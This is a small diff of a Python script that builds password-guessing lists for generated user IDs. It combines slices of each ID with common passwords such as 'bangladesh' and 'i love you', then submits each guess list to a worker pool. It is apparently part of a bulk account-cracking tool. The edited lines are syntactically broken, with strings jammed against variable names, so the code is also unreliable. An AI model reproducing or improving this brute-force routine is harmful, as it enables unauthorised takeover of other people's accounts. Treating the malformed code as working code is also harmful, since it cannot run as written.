@@ -293,14 +293,14 @@ def numb():
         for i in user:
             uid=code+i
             fb=tsg
-            pwx=[]
+            pwx=[code,code+codex,codex'bangladesh', '@#@#@#', 'i love you', '708090', '405060']
             pwx.append(uid[5:])#back 6
             pwx.append(uid[4:])#back 7
             pwx.append(uid[3:])#back 8
             pwx.append(uid[:6])#front 6
             pwx.append(uid[:7])#front 7
             pwx.append(uid[:8])#front 8
-            pwx.append(uid'bangladesh', '@#@#@#', 'i love you', '708090', '405060')
+            pwx.append(uid)# 11
             feel.submit(need,uid,pwx,fb,tl)
 
 
